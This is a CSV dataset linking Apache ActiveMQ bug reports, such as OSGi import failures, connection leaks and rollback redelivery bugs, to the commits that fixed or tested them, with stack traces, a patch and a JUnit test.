bug id,bug key,bug description,commit hash,commit msg
12483100,AMQ-2502,"If pooling is used, org.apache.activemq.pool.PooledConnectionFactory is instantiated using reflection. BND does not detect this, so compliant OSGI containers will throw a class not found exception. To fix, the following line should be added to the <activemq.osgi.import.pkg /> section of the pom:

org.apache.activemq.pool;resolution:=optional,",86e7d511a8e64e80abe28a66595ca9487668008e,"resolve https://issues.apache.org/activemq/browse/AMQ-2502, add optional import of pool

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@882136 13f79535-47bb-0310-9956-ffa450edef68"
12483743,AMQ-2488,"I have configured applications to use Log4J's JMSAppender in order to log messages on a queue as follows;

{noformat}
log4j.appender.jms=org.apache.log4j.net.JMSAppender
log4j.appender.jms.InitialContextFactoryName=org.apache.activemq.jndi.ActiveMQInitialContextFactory
log4j.appender.jms.ProviderURL=tcp://localhost:61616
log4j.appender.jms.TopicBindingName=logTopic
log4j.appender.jms.TopicConnectionFactoryBindingName=ConnectionFactory
{noformat}

Each application logging statement adds a new message to topic://logTopic on the broker.  I have a bundle deployed that attempts to route the messages from this topic with camel;

{code}
from(""activemq:topic:logTopic"")
  .convertBodyTo(String.class)
  .to(""log:foo?level=DEBUG&showProperties=true&showHeaders=true"");
{code}

When using servicemix 4 (Fuse 4.1.0.4), a stack trace is seen with the following message (enhanced using felix.log.level=4);


{noformat}Caused by: java.lang.ClassNotFoundException: *** Class 'org.apache.log4j.spi.LoggingEvent' 
was not found because bundle 56 does not import 'org.apache.log4j.spi' even though bundle 84 
does export it. To resolve this issue, add an import for 'org.apache.log4j.spi' to bundle 56. ***
{noformat}

Bundles as follows;

{noformat}smx@root:/> osgi/list|grep 56
[  56] [Active     ] [       ] [   60] activemq-core (5.3.0.fuse)

smx@root:/> osgi/list|grep 84
[  84] [Active     ] [       ] [    8] OPS4J Pax Logging - API (1.3.0)
{noformat}
",3ea1015a929ca4715ca0d79b074d727b94d1a062,"https://issues.apache.org/activemq/browse/AMQ-2488 - dynamic osgi import for activemq-core

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@898812 13f79535-47bb-0310-9956-ffa450edef68"
12482540,AMQ-2466,The addition of josql for the new admin commands in AMQ-2462 requires an import in admin-console.,c3881bf4f7e043f42175552d8eb0de3e699fd4d2,"https://issues.apache.org/activemq/browse/AMQ-2466 - josql osgi

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@830122 13f79535-47bb-0310-9956-ffa450edef68"
12483876,AMQ-2453,"The start-scripts ""activemq"" and ""activemq-admin"" do not seem to be ready for production use.

Reasons:
- Server does not run in background
  => this can be done by redirecting output to a file and run in background
  => in my opinion this should be implemented directly in java
  => the console log should be written by log4j to <install-root>/data/console.log
- The process should be started on a non-root user 
  => use 'su -c ""$COMMAND"" - $RUN_AS_USER' 
  => this should be defined in /etc/activemq.conf
- The script should support a ""reload"" feature to reload the configurartion
  (if activemq supports reloading)
- The script should support a ""status"" option
  => this should show a quick overview about the state of activemq
  => this should return a value != 0 if the service is not working
     (this is important for cluster integration)

Does anybody already working on these items?
Do you have suggestions for a implementation?
",e0776ff0208d8570351202ab15baada0eba014b2,"Fix for: https://issues.apache.org/jira/browse/AMQ-2453

Add an LSB header to the init scripts 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1368455 13f79535-47bb-0310-9956-ffa450edef68"
12483296,AMQ-2448,"I've discovered a reproducible memory leak.  After discussion on IRC, it is believed to be related to my network of brokers configuration.
I have a total of 4 brokers configured on 4 hosts (activemq1,2,3,4).
activemq1 and activemq2 are a shared filesystem master slave pair.  activemq3 and activemq4 are setup in a similar way as a master/slave pair.
Only one of activemq1 and 2 will be active at a time, likewise only one of activemq3 and 4.

Both activemq1 and activemq2 have a config with the following networkConnector.
<networkConnectors>
                <networkConnector
                        uri=""static://(tcp://activemq3:61616,tcp://activemq4:61616)""
                        name=""Connection to 3 and 4""
                        networkTTL=""5""
                        dynamicOnly=""true""/>
</networkConnectors>

The broker will only be able to connect to either 3 or 4 as only one can be running at a time.
For obvious reasons, connecting to the slave will fail, but the connection attempt will be retried every 30 seconds by default (more often on initial startup due to backoff algorithm).
It is believed that the continuous reconnect attempts are the source of the memory leak.",ce8f83acf1112aa6f6773aa1010aa6ea569faf06,"https://issues.apache.org/activemq/browse/AMQ-2448 - adding test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@931216 13f79535-47bb-0310-9956-ffa450edef68"
12482976,AMQ-2447,"the error comes from even though we already define specific helpFile field in BstatCommand, but this field can't be overriden in the method printHelp() in QueryCommand

add   printHelp() method for BstatCommand can fix it",a015154bd8dac7ee9de527ed9a00b3eb2ff756a8,"Apply patch for https://issues.apache.org/activemq/browse/AMQ-2447

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@825009 13f79535-47bb-0310-9956-ffa450edef68"
12482130,AMQ-2440,"The bug is observed on code checkout from https://svn.apache.org/repos/asf/activemq/tags/activemq-5.3.0
A server is initiated with stomp+nio transport on port 61612.

A client connects. A SelectorWorker is created on SelectorManager:68.
If the client drops the connection an exception is received at StompNIOTransport:91.
""java.io.IOException: An existing connection was forcibly closed by the remote host"".
But selector are not cleaned up. It works with stomp transport. But not with stomp+nio.

What I see in the end is an increasing number of ""connections"" if the JVM.
",8141baacefe292ce9b3eebd1184a04bd0c5d085b,"https://issues.apache.org/activemq/browse/AMQ-2440 - adding initial activemq-stomp.xml configuration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@897262 13f79535-47bb-0310-9956-ffa450edef68"
12482130,AMQ-2440,"The bug is observed on code checkout from https://svn.apache.org/repos/asf/activemq/tags/activemq-5.3.0
A server is initiated with stomp+nio transport on port 61612.

A client connects. A SelectorWorker is created on SelectorManager:68.
If the client drops the connection an exception is received at StompNIOTransport:91.
""java.io.IOException: An existing connection was forcibly closed by the remote host"".
But selector are not cleaned up. It works with stomp transport. But not with stomp+nio.

What I see in the end is an increasing number of ""connections"" if the JVM.
",1f6f0c510777db3baf4fbc000b51dec3926fd46a,"https://issues.apache.org/activemq/browse/AMQ-2440 - add commons-management dependency needed for camel 2.2.0 web app

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@921291 13f79535-47bb-0310-9956-ffa450edef68"
12483096,AMQ-2439,"Every time the broker is restarted, the same set of duplicate messages get redelivered to consumers.",1d5bcaf2743d66bc6a99384239d95bb35c7334e6,"AMQ-2439: Unit test for the kahadb message store


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@821103 13f79535-47bb-0310-9956-ffa450edef68"
12483007,AMQ-2413,"I don't understand the intent of the following code in Queue.doPageIn() and in rev 818147 it was causing delivery to the consumer to get hung (temporarily until message expiration check kickstarts it again). See the commented out lines of code that determine how many messages to attempt to page in. 

{code}
    private List<QueueMessageReference> doPageIn(boolean force) throws Exception {
        List<QueueMessageReference> result = null;
        List<QueueMessageReference> resultList = null;
        synchronized(dispatchMutex) {
            //WHAT IS THIS DOING?
            //int toPageIn = getMaxPageSize() + Math.max(0, (int)destinationStatistics.getInflight().getCount()) -pagedInMessages.size();

            //DOES THIS MAKE MORE SENSE:
            int toPageIn = Math.min(getMaxPageSize(), messages.size());
            
            if (LOG.isDebugEnabled()) {
                LOG.debug(destination.getPhysicalName() + "" toPageIn: ""  + toPageIn + "", Inflight: ""
                        + destinationStatistics.getInflight().getCount()
                        + "", pagedInMessages.size "" + pagedInMessages.size());
            }
            
            //WHAT IS THIS DOING?
            //toPageIn = Math.max(0, Math.min(toPageIn, getMaxPageSize()));
                       
            if (isLazyDispatch()&& !force) {
                // Only page in the minimum number of messages which can be dispatched immediately.
                toPageIn = Math.min(getConsumerMessageCountBeforeFull(), toPageIn);
            }
   
{code}

It is definitely possible that I'm just not understanding the intent of the code, but whatever it is, it's not working, and consequently I'm not sure that the subsequent fixes on the branch have eliminated the problem. The attached patch contains both a unit test, that tests several combinations of ack mode, vm cursoring, and delivery mode, as well as version of Queue which should be applied against revirion 818147 -- this version has the fix commented out and preserves the buggy behavior",74148299dc95dc97600d58a997e121b859ce7fc6,"https://issues.apache.org/activemq/browse/AMQ-2413 - prevent test failures on slow machines

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@819493 13f79535-47bb-0310-9956-ffa450edef68"
12482929,AMQ-2401,"While running performance tests I I was seeing hangs in several tests  involving dups ok queue receivers. My suspicion is that this is related to ""too lazy"" dups_ok acknowledgements. Changing the queue prefetchLimit to 100 caused this problem to go away. This needs more investigation, but it seems like we can get ourselves in to trouble if the queue size is smaller than the receiver's prefetchLimit, and this should be avoid. It is also possible that there is something more complicated happening in my tests. I haven't yet been able to reproduce this outside my performance test environment. 
",7f534db142bad99aa8564906e3a6703027a40f35,"Adding a modified version of the test case attached to AMQ2401.  This test would fail quickly before the patch in revision 818487 was applied.



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@818496 13f79535-47bb-0310-9956-ffa450edef68"
12483041,AMQ-2393,<NA>,da6809ced39e304728aebeec3561fed644ec7568,"https://issues.apache.org/activemq/browse/AMQ-2393 - add repositories for jsr311-api

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@815661 13f79535-47bb-0310-9956-ffa450edef68"
12482807,AMQ-2384,"On running a Tenable nessus scan against the machine where ActiveMQ is running, we see that the port 61616 , the TCP connector port accepts Low and Medium strength ciphers by default. This may be a security risk and therefore we need a way to specify which ciphers to support.",9822d58d04abe22f059b85b418478a4f80592322,"resolve https://issues.apache.org/activemq/browse/AMQ-2384 - not exactly the patch but allowing the introspector to work, which is more generic with some tests, thanks phil for the impetus on this

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@929618 13f79535-47bb-0310-9956-ffa450edef68"
12482485,AMQ-2383,"When I run the attached test case I notice the following exception in the logs. 

javax.jms.JMSException: Transaction 'TX:ID:gr-gr-60307-1252609475470-2:1:1' has not been started.
	at org.apache.activemq.broker.TransactionBroker.getTransaction(TransactionBroker.java:270)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:190)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)",28443226b67529ed1cef132db8634cd73a981c58,"test case for: https://issues.apache.org/activemq/browse/AMQ-2383 - works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813734 13f79535-47bb-0310-9956-ffa450edef68"
12482864,AMQ-2346,"In geronimo we're seeing an intermittent tck problem that seems to relate to a situation where there are:
-- a BMT stateless session ejb
-- two connections (I think these get shared to the same ManagedConnection)
-- two sessions
-- tx control through UT
-- send a message in one tx
-- receive message in a tx that is rolled back
-- receive message in a tx that is committed

In a public test case I'm seeing that the session proxies get confused about whether there is an active transaction.  This doesn't happen all the time but with a few repititions it happens consistently.

See GERONIMO-4784",490dcf9bd2111180d5d7821d3cda4a68e8c3de75,"AMQ-2346 test demonstrating problem (set to not run)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@805881 13f79535-47bb-0310-9956-ffa450edef68"
12482784,AMQ-2327,"In a network of brokers of a size of 4 (or more) and using conduit subscriptions, some ""proxy"" consumers can be left hanging due to circular references.",83f519cd657aea378c3d7a4452f71318a2dbdcdf,https://issues.apache.org/jira/browse/AMQ-2327 - fix regression in org.apache.activemq.network.NetworkBrokerDetachTest - need to conduit statically included durables when dynamicOnly=false (local networkSubs)
12482766,AMQ-2305,"In a pure Master/Slave configuration, when the slave fails the TransportConnection invokes the MasterBroker's stop() method without taking into consideration the shutdownOnSlaveFailure boolean, which by default is set to false.  So even if shutdownOnSlaveFailure  is set to false, all my plugin brokers' stop methods get invoked when the slave fails.  ",a0b9aec6e95c566c22e04e8874f9729ec4490819,"test case for https://issues.apache.org/activemq/browse/AMQ-2305 - seems to work fine

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@788429 13f79535-47bb-0310-9956-ffa450edef68"
12482932,AMQ-2292,"When you try and use the ReadOnlyAsyncDataManager it throws a NullPointerException like the following:

java.lang.NullPointerException
	at org.apache.activemq.kaha.impl.async.AsyncDataManager.getNextLocation(AsyncDataManager.java:547)
	at org.apache.activemq.kaha.impl.async.ReadOnlyAsyncDataManager.getFirstLocation(ReadOnlyAsyncDataManager.java:128)
	at org.apache.activemq.kaha.impl.async.JournalImplTest.testReadOnlyRead(JournalImplTest.java:161)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:585)
	at junit.framework.TestCase.runTest(TestCase.java:168)
	at junit.framework.TestCase.runBare(TestCase.java:134)
	at junit.framework.TestResult$1.protect(TestResult.java:110)
	at junit.framework.TestResult.runProtected(TestResult.java:128)
	at junit.framework.TestResult.run(TestResult.java:113)
	at junit.framework.TestCase.run(TestCase.java:124)
	at junit.framework.TestSuite.runTest(TestSuite.java:232)
	at junit.framework.TestSuite.run(TestSuite.java:227)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:81)


The ReadOnlyDataManager needs to init an accessorPool. Testcase and patch attached.",2cdb51bb748250762891554739ca2125c13122c6,"fix for https://issues.apache.org/activemq/browse/AMQ-2292 - ReadOnlyAsyncDataManager NPE

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@785525 13f79535-47bb-0310-9956-ffa450edef68"
12482910,AMQ-2274,"I use ActiveMQ 5.2 and configure a client using jndi.properties with connection url:
connection.TopicConnectionFactory.brokerURL=tcp://localhost:61616?soTimeout=30000&connectionTimeout=30000&keepAlive=true&minmumWireFormatVersion=3&jms.prefetchPolicy.all=5


All boolean properties (keepAlive) are ignored",fbddf4f8683a0c246899b290ad9269c42367188d,"resolve https://issues.apache.org/activemq/browse/AMQ-2274 - add simple Boolean PropertyEditor implementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@783281 13f79535-47bb-0310-9956-ffa450edef68"
12482881,AMQ-2249,"PooledConnection.close() calls rollback() on the internal session. However, when the internal session is an instance of  ActiveMQXASession, this always results in a TransactionInProgressException being thrown (and subsequently caught). Unfortunately, in this path of execution, the session pool is not informed.

The sessionPool knows nothing about the session being discarded and ultimately, GenericObjectPool.borrowObject() blocks forever since _numActive is never decremented.

I think the pool should at least be told that the session has been invalidated (this is not a full fix but should at least stop any hanging threads). Below is a partial patch (I'll work on a full solution when I have time):
{code} 
Index: activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java
===================================================================
--- activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (revision 768326)
+++ activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (working copy)
@@ -120,6 +120,7 @@
                         LOG.trace(""Ignoring exception as discarding session: "" + e1, e1);
                     }
                     session = null;
+                    sessionPool.invalidateSession(this);
                     return;
                 }
             }
Index: activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java
===================================================================
--- activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (revision 768326)
+++ activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (working copy)
@@ -59,6 +59,14 @@
             throw JMSExceptionSupport.create(e);
         }
     }
+    
+    public void invalidateSession(PooledSession session) throws JMSException {
+       try {
+            getSessionPool().invalidateObject(session);
+        } catch (Exception e) {
+            throw JMSExceptionSupport.create(""Failed to invalidate session: "" + e, e);
+        }
+    }
 
     public void returnSession(PooledSession session) throws JMSException {
         // lets check if we are already closed
{code} ",eae5aa09d1237cd299f555ade4256d989be7497b,"Fix for https://issues.apache.org/activemq/browse/AMQ-2249

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813053 13f79535-47bb-0310-9956-ffa450edef68"
12482803,AMQ-2241,"localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:50)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1359)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:300)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSessionProxy(ManagedConnectionProxy.java:119)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSession(ManagedConnectionProxy.java:105)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462)
	... 35 more
Caused by: java.lang.IllegalStateException: localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:540)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
	at java.lang.Thread.run(Thread.java:619)
",01e2aec7b59cf5def1c69a6c2208c7648b6956d2,"resolve https://issues.apache.org/activemq/browse/AMQ-2241 - ensure default session is created for a duplicate connection request

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@771718 13f79535-47bb-0310-9956-ffa450edef68"
12482803,AMQ-2241,"localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:50)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1359)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:300)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSessionProxy(ManagedConnectionProxy.java:119)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSession(ManagedConnectionProxy.java:105)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462)
	... 35 more
Caused by: java.lang.IllegalStateException: localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:540)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
	at java.lang.Thread.run(Thread.java:619)
",9383c6d697658f6ac7902e621124649b510b6bb3,"resolve alternative path to https://issues.apache.org/activemq/browse/AMQ-2241 via ra where connection is reused. state tracker was not notified when remove command is suppressed and simulated during transport outage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@774712 13f79535-47bb-0310-9956-ffa450edef68"
12483038,AMQ-2233,"After rollback received messages not re-presented.  If I receive in a transaction and then roll back the messages should be re-presented in the next transaction.  This used to work in 5.1.0, but is broken in 5.2.0.

You can browse the Queue in JMX after the rollback and see that the messages are still there, but they are not received by a consumer in the same process.

Here's a test case (fails on the checkPostConditions()):

{code}
public class RawRollbackTests {
	
	private static ConnectionFactory connectionFactory;
	private static Destination queue;
	private static BrokerService broker;

	@BeforeClass
	public static void clean() throws Exception {
		FileUtils.deleteDirectory(new File(""activemq-data""));
		broker = new BrokerService();
		broker.setUseJmx(true);
		broker.start();
		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory();
		connectionFactory.setBrokerURL(""vm://localhost?async=false"");
		RawRollbackTests.connectionFactory = connectionFactory;
		queue = new ActiveMQQueue(""queue"");
	}

	@AfterClass
	public static void close() throws Exception {
		broker.stop();
	}

	@Before
	public void clearData() throws Exception {
		getMessages(false); // drain queue
		convertAndSend(""foo"");
		convertAndSend(""bar"");
	}


	@After
	public void checkPostConditions() throws Exception {

		Thread.sleep(1000L);
		List<String> list = getMessages(false);
		assertEquals(2, list.size());

	}

	@Test
	public void testReceiveMessages() throws Exception {

		List<String> list = getMessages(true);
		assertEquals(2, list.size());
		assertTrue(list.contains(""foo""));

	}
	
	private void convertAndSend(String msg) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		MessageProducer producer = session.createProducer(queue);
		producer.send(session.createTextMessage(msg));
		producer.close();
		session.commit();
		session.close();
		connection.close();
	}

	private List<String> getMessages(boolean rollback) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		String next = """";
		List<String> msgs = new ArrayList<String>();
		while (next != null) {
			next = (String) receiveAndConvert(session);
			if (next != null)
				msgs.add(next);
		}
		if (rollback) {
			session.rollback();
		} else {
			session.commit();
		}
		session.close();
		connection.close();
		return msgs;
	}

	private String receiveAndConvert(Session session) throws Exception {
		MessageConsumer consumer = session.createConsumer(queue);
		Message message = consumer.receive(100L);
		consumer.close();
		if (message==null) {
			return null;
		}
		return ((TextMessage)message).getText();
	}
}
{code}",245771a14d81dda10a64a70406ea40cac7433f36,"test case for https://issues.apache.org/activemq/browse/AMQ-2233 with prefetch  workaround

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@773862 13f79535-47bb-0310-9956-ffa450edef68"
12483038,AMQ-2233,"After rollback received messages not re-presented.  If I receive in a transaction and then roll back the messages should be re-presented in the next transaction.  This used to work in 5.1.0, but is broken in 5.2.0.

You can browse the Queue in JMX after the rollback and see that the messages are still there, but they are not received by a consumer in the same process.

Here's a test case (fails on the checkPostConditions()):

{code}
public class RawRollbackTests {
	
	private static ConnectionFactory connectionFactory;
	private static Destination queue;
	private static BrokerService broker;

	@BeforeClass
	public static void clean() throws Exception {
		FileUtils.deleteDirectory(new File(""activemq-data""));
		broker = new BrokerService();
		broker.setUseJmx(true);
		broker.start();
		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory();
		connectionFactory.setBrokerURL(""vm://localhost?async=false"");
		RawRollbackTests.connectionFactory = connectionFactory;
		queue = new ActiveMQQueue(""queue"");
	}

	@AfterClass
	public static void close() throws Exception {
		broker.stop();
	}

	@Before
	public void clearData() throws Exception {
		getMessages(false); // drain queue
		convertAndSend(""foo"");
		convertAndSend(""bar"");
	}


	@After
	public void checkPostConditions() throws Exception {

		Thread.sleep(1000L);
		List<String> list = getMessages(false);
		assertEquals(2, list.size());

	}

	@Test
	public void testReceiveMessages() throws Exception {

		List<String> list = getMessages(true);
		assertEquals(2, list.size());
		assertTrue(list.contains(""foo""));

	}
	
	private void convertAndSend(String msg) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		MessageProducer producer = session.createProducer(queue);
		producer.send(session.createTextMessage(msg));
		producer.close();
		session.commit();
		session.close();
		connection.close();
	}

	private List<String> getMessages(boolean rollback) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		String next = """";
		List<String> msgs = new ArrayList<String>();
		while (next != null) {
			next = (String) receiveAndConvert(session);
			if (next != null)
				msgs.add(next);
		}
		if (rollback) {
			session.rollback();
		} else {
			session.commit();
		}
		session.close();
		connection.close();
		return msgs;
	}

	private String receiveAndConvert(Session session) throws Exception {
		MessageConsumer consumer = session.createConsumer(queue);
		Message message = consumer.receive(100L);
		consumer.close();
		if (message==null) {
			return null;
		}
		return ((TextMessage)message).getText();
	}
}
{code}",558ff7802d797d2c63c9efa12f179de080d8910d,"additional test for https://issues.apache.org/activemq/browse/AMQ-2233, broker in 5.2, works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@775064 13f79535-47bb-0310-9956-ffa450edef68"
12483549,AMQ-2217,"I have written a test case which will demonstrate the difference between the following two scenarios:

1. Producer sending dissimilar JMSType messages to a queue, with a client consuming all messages (no selector).
2. Producer sending dissimilar JMSType messages to a queue, with a client consuming every other message (using selector).

With a large enough size of test messages (for my environment about 5k), scenario 2 will fail with delivery to the consumer halted, while scenario 1 will not.

Test Output:

waiting for consumer to pause ... consumer: 0, producer: 0
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000",9f0c86cc6d347ada5c6678f4d877cb04a3af2300,"commit test case with policy maxPageSize workaround in place that demonstrates it works as expected - https://issues.apache.org/activemq/browse/AMQ-2217

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995381 13f79535-47bb-0310-9956-ffa450edef68"
